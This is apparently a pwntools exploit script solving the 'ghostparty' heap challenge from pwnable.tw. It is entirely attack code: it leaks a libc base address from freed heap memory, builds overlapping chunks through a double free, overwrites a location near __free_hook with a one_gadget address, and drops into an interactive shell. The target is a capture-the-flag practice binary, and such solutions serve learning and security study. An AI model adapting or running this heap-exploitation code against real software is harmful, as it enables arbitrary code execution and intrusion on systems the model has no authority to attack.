from pwn import *

r = process('./ghostparty', env={'LD_PRELOAD': './libc.so.6'})
#r = remote('chall.pwnable.tw', 10401)
has_attr = ['2' ,'7']

join = '1'
give_up = '2'
join_hear = '3'

def add_ghost(name, age, msg, tp, act, attr=None, stop=False):
    r.sendlineafter(':', '1')
    r.sendlineafter(':', name)
    r.sendlineafter(':', age)
    r.sendlineafter(':', msg)
    r.sendlineafter(':', tp)
    if tp in has_attr:
        r.sendlineafter(':', attr)

    r.sendlineafter(':', act)

def rm_ghost(idx):
    r.sendlineafter(':', '4')
    r.sendlineafter('party :', str(idx))

main_arena_offset = 0x3c3b20
one_gadget_offset = 0x45216
free_hook = 0x3c57a8
malloc_hook = 0x3c3b10

add_ghost('double_free', '55', '55', '2', join, '55')
add_ghost('leak', '55', '55', '7', join, '5'*0x100)
add_ghost('leak2', '55', '55', '7', join, '')
# leak libc
r.sendlineafter(':', '2')
r.sendlineafter('party :', '2')
r.recvuntil('Blood : ')
libc = u64(r.recvn(6).ljust(8, '\x00'))-88-main_arena_offset
log.info('libc: '+hex(libc))

for i in range(0,7):
    add_ghost('overlap1', '55', '55', '7', join, 'a'*0x60)

add_ghost('overlap1', '55', '55', '7', join, 'a'*0x60)
add_ghost('overlap2', '55', '55', '7', join_hear, 'a'*0x60)
r.recvuntil('speak :')
rm_ghost(10)
rm_ghost(10)
rm_ghost(3)
add_ghost('overlap2', '55', '55', '7', join_hear, 'a'*0x40)
r.recvuntil('speak :')
add_ghost('overlap3', '55', '55', '7', join, p64(libc+free_hook-0x23).ljust(0x60, '\x00'))
add_ghost('overlap3', '55', '55', '7', join, ('b'*0x13+p64(libc+one_gadget_offset)).ljust(0x60, '\x00'))
add_ghost('overlap3', '55', '55', '7', join, ('b'*0x13+p64(libc+one_gadget_offset)).ljust(0x60, '\x00'))

r.sendlineafter(':', '3')

r.interactive()
